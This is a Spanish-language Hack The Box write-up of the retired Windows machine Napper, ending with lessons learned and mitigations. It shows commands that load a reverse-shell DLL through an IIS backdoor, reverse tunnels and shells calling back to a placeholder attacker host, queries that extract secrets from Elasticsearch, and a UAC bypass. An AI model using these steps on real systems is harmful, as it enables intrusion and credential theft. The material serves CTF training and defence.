---
machine: Napper
os: Windows
difficulty: Hard
platform: Hack The Box
state: Retired
tags: [windows, iis, hugo, elastic, backdoor, uac, privesc]
---

# Napper — Hack The Box (Windows)

[🇬🇧 English](README.en.md) | **Español**

> **Estado:** Retired. Ficha de referencia; sin flags ni credenciales reales.

## TL;DR

Un blog Hugo publicado en IIS revela en un artículo las credenciales de ejemplo de Basic Auth (`<EXAMPLE_USER>:<EXAMPLE_PASSWORD>`), que funcionan en `internal.napper.htb`. Ese sitio describe un backdoor de IIS que atiende `/ews/MsExgHealthCheckd/` con un ejecutable .NET en base64 en el parámetro `sdafwe3rwe23`. El backdoor existe en el host: se compila una DLL con una clase `Run` que abre una reverse shell y se envía al endpoint, obteniendo `ruben`. En `C:\temp\www\internal` hay un `.env` con credenciales de Elasticsearch y `a.exe`, el cliente que rota la contraseña de `backup`. Elastic escucha en `localhost:9200`; se accede con un túnel, se leen `seed` y `blob`, se reconstruye la clave AES-CFB y se descifra la contraseña de `backup`. `RunasCs --bypass-uac` da un token administrativo y la flag de root.

## Reconocimiento

```bash
nmap -Pn -p- --min-rate 10000 <IP>
nmap -Pn -sCV -p80,443 <IP>
```

- `80` IIS 10.0, redirección a `https://app.napper.htb`.
- `443` IIS con Hugo 0.112.3, certificado para `app.napper.htb`.
- Virtual hosts: `app.napper.htb` e `internal.napper.htb` (401).

```bash
ffuf -u https://<IP> -H 'Host: FUZZ.napper.htb' \
  -w subdomains-top1million-20000.txt -mc all -ac
```

## Enumeración

`app.napper.htb` es un blog estático. El artículo sobre Basic Auth en IIS muestra el comando de creación del usuario y las credenciales de ejemplo `<EXAMPLE_USER>:<EXAMPLE_PASSWORD>`. Esas credenciales abren `internal.napper.htb`.

El post interno cita una investigación sobre malware IIS: el backdoor responde en `/ews/MsExgHealthCheckd/`, recibe un assembly .NET en base64 en `sdafwe3rwe23` e invoca una clase `Run`. También indica que la respuesta incluye `Microsoft-HTTPAPI/2.0` en el header `Server`.

```bash
curl -i http://napper.htb/ews/MsExgHealthCheckd/
curl -i -X POST -d 'sdafwe3rwe23=' http://napper.htb/ews/MsExgHealthCheckd/
```

El GET devuelve 404 con `Microsoft-HTTPAPI/2.0`; el POST devuelve 200.

## Foothold

Se compila una DLL con una clase `Run` cuyo constructor abre una conexión TCP y lanza `cmd.exe`:

```bash
mcs -target:library -out:rev.dll rev.cs
base64 -w0 rev.dll > rev.b64
```

El código debe usar `namespace rev`, `public class Run` y un constructor `Run()` que conecte a `<ATTACKER>:443`. Se envía el base64 URL-encoded como valor de `sdafwe3rwe23`:

```bash
curl -X POST --data-urlencode 'sdafwe3rwe23@rev.b64' \
  http://napper.htb/ews/MsExgHealthCheckd/
```

Con `nc -lnvp 443` se recibe una shell como `napper\ruben` y se lee `C:\Users\ruben\Desktop\user.txt`.

## Movimiento lateral

En `C:\temp\www\internal\content\posts\internal-laps-alpha` hay un `.env` y `a.exe`:

```text
ELASTICUSER=user
ELASTICPASS=<PASSWORD>
ELASTICURI=https://127.0.0.1:9200
```

El post borrador `no-more-laps.md` explica que la contraseña de `backup` se guarda en Elastic. `netstat -ano` confirma `127.0.0.1:9200` y `9300`. Se sube Chisel por SMB y se crea un túnel inverso:

```powershell
.\c.exe client <ATTACKER>:8000 R:9200:127.0.0.1:9200
```

```bash
curl -k 'https://user:<PASSWORD>@127.0.0.1:9200/_cat/indices?v'
curl -k 'https://user:<PASSWORD>@127.0.0.1:9200/seed/_search'
curl -k 'https://user:<PASSWORD>@127.0.0.1:9200/user-00001/_search'
```

`seed` contiene un entero y `user-00001` un `blob` en base64.

## Escalada de privilegios

`a.exe` es un binario Go que usa `godotenv` y `go-elasticsearch`. `main.getKey` siembra `math/rand` con el valor de `seed`, genera 16 enteros entre 1 y 254 y los usa como clave. `main.encrypt` usa AES-CFB con el IV en los primeros 16 bytes del blob. Se replica en Go:

```go
rand.Seed(seed)
key := make([]byte, 16)
for i := range key { key[i] = byte(rand.Intn(254) + 1) }
block, _ := aes.NewCipher(key)
iv, ct := ciphertext[:aes.BlockSize], ciphertext[aes.BlockSize:]
stream := cipher.NewCFBDecrypter(block, iv)
stream.XORKeyStream(plaintext, ct)
```

La contraseña de `backup` cambia cada cinco minutos. Se usa `RunasCs` para lanzar PowerShell como `backup`:

```powershell
.\r.exe backup <PASSWORD> powershell -r <ATTACKER>:9001 --bypass-uac
```

Sin `--bypass-uac` el token está filtrado y no permite leer `C:\Users\Administrator\Desktop`; con el flag se habilitan `SeBackup`, `SeDebug`, `SeImpersonate` y el resto de privilegios administrativos. Se lee `root.txt`.

## Evidencia

- Credenciales de ejemplo del blog válidas en `internal.napper.htb`.
- POST a `/ews/MsExgHealthCheckd/` con `sdafwe3rwe23` devolviendo 200.
- Shell como `napper\ruben`.
- `.env` con credenciales de Elastic y túnel a `9200`.
- Índices `seed` y `user-00001` con el blob cifrado.
- `RunasCs --bypass-uac` y lectura de `root.txt`.

## Lecciones aprendidas

- La documentación y los blogs internos filtran credenciales y rutas de backdoors.
- Un backdoor que carga assemblies .NET ofrece ejecución directa si se conoce el contrato.
- Elasticsearch sin autenticación fuerte en localhost sigue siendo accesible tras un túnel.
- Una clave derivada de un PRNG sembrado con un valor público no aporta seguridad.
- `RunasCs` sin `--bypass-uac` puede dar un token filtrado aunque el usuario sea administrador.

## Mitigaciones y detección

- No reutilizar credenciales de ejemplo ni publicarlas en documentación.
- Eliminar backdoors y revisar `Server` headers y rutas anómalas en IIS.
- Proteger Elasticsearch con TLS, autenticación y bind a loopback; auditar índices con secretos.
- No derivar claves de contraseñas con PRNG no criptográfico; usar un KDF y un almacén de secretos.
- Monitorizar `RunasCs`, túneles Chisel, accesos a `9200` y creación de procesos con tokens elevados.

## Referencias

- [0xdf — Napper](https://0xdf.gitlab.io/2024/05/04/htb-napper.html)
- [IppSec — Napper](https://www.youtube.com/watch?v=ESXW8jsGkdM)
- [Elastic — IIS malware](https://www.elastic.co/security-labs/iis-malware)
- [Hack The Box — Napper](https://app.hackthebox.com/machines/napper)
